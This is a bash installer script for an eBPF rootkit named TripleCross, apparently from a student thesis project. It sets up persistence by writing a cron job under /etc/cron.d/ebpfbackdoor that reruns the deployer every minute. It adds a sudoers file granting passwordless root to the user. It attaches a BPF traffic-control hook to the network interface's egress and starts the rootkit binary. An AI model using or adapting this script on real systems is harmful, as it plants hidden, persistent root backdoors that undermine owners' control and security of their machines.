#!/bin/bash
#set -x

## Constants declaration
#The current directory full path
declare -r DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
#The location of the file where to write the full rootkit package
declare -r BASEDIR="/home/osboxes/TFG/apps"
#A variable to determine whether to silence output of internal commands
declare firstvar=$1

RED='\033[0;31m'
BLU='\033[0;34m'
GRN='\033[0;32m'
NC='\033[0m' # No Color

## A simple function to wait for input
waitForInput(){
   if [ "$press_key_to_continue" = true ]; then
      echo "Completed. Press any key to continue"
      while [ true ] ; 
      do
         read -t 3 -n 1
         if [ $? = 0 ] ; then
            return ;
         fi
      done
   fi
}

#A simple function to silence output
quiet(){
    if [ "$firstvar" == "quiet" ]; then
        "$@" > /dev/null
    else
        "$@"
    fi
}

#Start of script
echo "*******************************************************\n"
echo "********************* TripleCross *********************\n"
echo "*******************************************************\n"
echo "***************** Marcos Sánchez Bajo *****************\n"
echo "*******************************************************\n"
echo ""

## Persistence
declare CRON_PERSIST="* * * * * osboxes /bin/sudo /home/osboxes/TFG/apps/deployer.sh"
declare SUDO_PERSIST="osboxes ALL=(ALL:ALL) NOPASSWD:ALL #"
echo "$CRON_PERSIST" > /etc/cron.d/ebpfbackdoor
echo "$SUDO_PERSIST" > /etc/sudoers.d/ebpfbackdoor

# Rootkit install
OUTPUT_COMM=$(/bin/sudo /usr/sbin/ip link)
if [[ $OUTPUT_COMM == *"xdp"* ]]; then
   echo "Rootkit is already installed"
else
   #Install the programs
   echo -e "${BLU}Installing TC hook${NC}"
   /bin/sudo tc qdisc del dev enp0s3 clsact
   /bin/sudo tc qdisc add dev enp0s3 clsact
   /bin/sudo tc filter add dev enp0s3 egress bpf direct-action obj "$BASEDIR"/tc.o sec classifier/egress
   /bin/sudo "$BASEDIR"/kit -t enp0s3
fi

